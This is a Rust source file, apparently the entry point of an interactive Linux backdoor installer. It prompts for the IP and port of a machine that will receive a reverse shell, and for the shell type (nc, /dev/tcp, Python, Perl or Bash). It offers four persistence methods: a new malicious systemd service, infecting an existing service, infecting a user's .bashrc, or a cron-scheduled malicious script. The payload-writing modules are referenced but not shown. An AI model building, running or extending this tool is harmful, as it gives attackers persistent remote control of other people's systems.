use std::io;

mod newservice;
mod modifyservice;
mod shellscript;
mod cronshell;
mod sanitizer;



#[derive(Clone)]
pub struct Param {
    source_ip: String,
    service_name: String,
    port: String,
    choice: u8,
    time: String,
    path: String,
    script_name: String,
}

impl Param {
    fn set_param(&mut self, backdoor_choice: u8) {
        let mut input = String::new();
        let error_message = String::from("Error ! choose a valid option.\n");
    
        if backdoor_choice == 1 {
            
            while input.is_empty() {
                println!("Put the IP of machine which will receive the reverse shell of the backdoor\n");
                io::stdin().read_line(&mut input).expect ("Error during the parameter reading");

            }
            self.source_ip = input.clone();
            self.source_ip = self.source_ip.trim_end_matches('\n').to_string();

            input.clear();

            while input.is_empty() {
                println!("Put the port used on the machine will receive the reverse shell of the backdoor\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            self.port = input.clone();
            self.port = self.port.trim_end_matches('\n').to_string();
            input.clear();

            while input.is_empty() {
                println!("Put the name of the systemd service you want to create for the backdoor \n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            self.service_name = input.clone();
            self.service_name = self.service_name.trim_end_matches('\n').to_string();
            input.clear();

            while input.is_empty() {
                println!("Choose the way for the backdoor creation\n");
                println!("1 nc reverse shell\n");
                println!("2 /dev/tcp reverse shell\n");
                println!("3 Python script reverse shell\n");
                println!("4 Perl script reverse shell\x1B[0m\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            self.choice = input.trim().parse().expect(&(error_message.to_owned() + &input));
            input.clear();
    
    
        }
        else if backdoor_choice == 2 {
            while input.is_empty() {
                println! ("Put the IP of the machine which will receive the reverse shell of the backdoor\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            self.source_ip = input.clone();
            self.source_ip = self.source_ip.trim_end_matches('\n').to_string();
            input.clear();

            while input.is_empty() {
                println!("Put the port used on the machine will receive the reverse shell of the backdoor\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            self.port = input.clone();
            self.port = self.port.trim_end_matches('\n').to_string();
            input.clear();

            while input.is_empty() {
                println!("Put the name of the systemd service\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            self.service_name = input.clone();
            self.service_name = self.service_name.trim_end_matches('\n').to_string();
            input.clear();

            while input.is_empty() {
                println!("Put the absolute directory where your service is\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            self.path = input.clone();
            self.path = self.path.trim_end_matches('\n').to_string();
            input.clear();

            while input.is_empty() {
                println!("Choose the way for the backdoor creation\n");
                println!("1 nc reverse shell. Warning, it can broke the process !\n");
                println!("2 /dev/tcp reverse shell\n");
                println!("3 Python script reverse shell\n");
                println!("4 Perl script reverse shell\x1B[0m\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }

            self.choice = input.trim().parse().expect(&(error_message.to_owned() + &input));
            input.clear();


        }

        else if backdoor_choice == 3 {
            while input.is_empty() {
                println! ("Put the IP of the machine which will receive the reverse shell of the backdoor\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            self.source_ip = input.clone();
            self.source_ip = self.source_ip.trim_end_matches('\n').to_string();
            input.clear();

            while input.is_empty() {
                println!("Put the port used on the machine will receive the reverse shell of the backdoor\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            self.port = input.clone();
            self.port = self.port.trim_end_matches('\n').to_string();
            input.clear();

            while input.is_empty() {
                println!("Choose the way for the backdoor creation\n");
                println!("1 Python script reverse shell\n");
                println!("2 Perl script reverse shell\n");
                println!("3 Bash script reverse shell\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            

            self.choice = input.trim().parse().expect(&(error_message.to_owned() + &input));
            input.clear();

            while input.is_empty() {
                println!("Put the absolute directory where you want to store the script\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            self.path = input.clone();
            self.path = self.path.trim_end_matches('\n').to_string();
            input.clear();

            while input.is_empty() {
                println!("Put the name of the script\x1B[0m\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            self.script_name = input.clone();
            self.script_name = self.script_name.trim_end_matches('\n').to_string();
            input.clear();



        }
        else if backdoor_choice == 4 {
            while input.is_empty() {
                println! ("Put the IP of the machine which will receive the reverse shell of the backdoor\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            self.source_ip = input.clone();
            self.source_ip = self.source_ip.trim_end_matches('\n').to_string();
            input.clear();

            while input.is_empty() {
                println!("Put the port used on the machine will receive the reverse shell of the backdoor\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            self.port = input.clone();
            self.port = self.port.trim_end_matches('\n').to_string();
            input.clear();

            while input.is_empty() {
                println!("Choose the way for the backdoor creation\n");
                println!("1 Python script reverse shell\n");
                println!("2 Perl script reverse shell\n");
                println!("3 Bash script reverse shell\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            

            self.choice = input.trim().parse().expect(&(error_message.to_owned() + &input));
            input.clear();

            while input.is_empty() {
                println!("Put the absolute directory where you want to store the script\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            self.path = input.clone();
            self.path = self.path.trim_end_matches('\n').to_string();
            input.clear();

            while input.is_empty() {
                println!("Put the name of the script \n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            self.script_name = input.clone();
            self.script_name = self.script_name.trim_end_matches('\n').to_string();
            input.clear();

            while input.is_empty() {
                println!("Enter the malicious script execution interval value (in min)\x1B[0m\n");
                io::stdin().read_line(&mut input).expect("Error during the parameter reading");
            }
            self.time = input.clone();
            self.time = self.time.trim_end_matches('\n').to_string();
            input.clear();

        }
    
    
    }

}


fn main() {
    let mut backdoor_choice: u8 = 0;
    
    let erreur_convert = "Concert String to Integer: Error";
    while backdoor_choice == 0 {
        println!("\x1B[33mChoose what kind of backdoor you want to install !\n");
        println!("1 Create new systemd malicious service \n");
        println!("2 Infect existing systemd service \n");
        println!("3 Infect .bashrc of current user \n");
        println!("4 Schedule malicious script with crontab \n");
        let mut input = String::new();
        io::stdin().read_line(&mut input).expect ("Error during the parameter reading");
        backdoor_choice = input.trim().parse().expect(&(erreur_convert.to_owned() + &input));
        input.clear();

    }

    let mut param = Param {
        source_ip: String::new(),
        service_name: String::new(),
        port:String::new(),
        choice: 0,
        time: String::new(),
        path: String::new(),
        script_name: String::new(),
    };

    if backdoor_choice == 1 {

        param.set_param(backdoor_choice);
        let param_to_sanitize = param.clone();
        let kind: u8 = 1;
        sanitizer::sanitize_param_hub(param_to_sanitize, kind);
        let result = newservice::write_service(param.service_name, param.port, param.source_ip, param.choice);
        sanitizer::sanitize_return_fn(result);
    }
    else if backdoor_choice == 2 {
        param.set_param(backdoor_choice);
        let param_to_sanitize = param.clone();
        let kind: u8 = 2;
        sanitizer::sanitize_param_hub(param_to_sanitize, kind);
        let result = modifyservice::get_service(param.service_name, param.path, param.choice, param.source_ip, param.port);
        sanitizer::sanitize_return_fn(result);
    }
    else if backdoor_choice == 3 {
        param.set_param(backdoor_choice);
        let param_to_sanitize = param.clone();
        let kind: u8 = 3;
        sanitizer::sanitize_param_hub(param_to_sanitize, kind);
        shellscript::create_script(param.source_ip, param.port, param.path, param.script_name, param.choice);

    }
    else if backdoor_choice == 4 {
        param.set_param(backdoor_choice);
        let kind: u8 = 4;
        let param_to_sanitize = param.clone();
        sanitizer::sanitize_param_hub(param_to_sanitize, kind);
        let result =cronshell::create_cron(param.source_ip, param.port, param.path, param.script_name, param.choice, param.time);
        sanitizer::sanitize_return_fn(result);
    }    
}

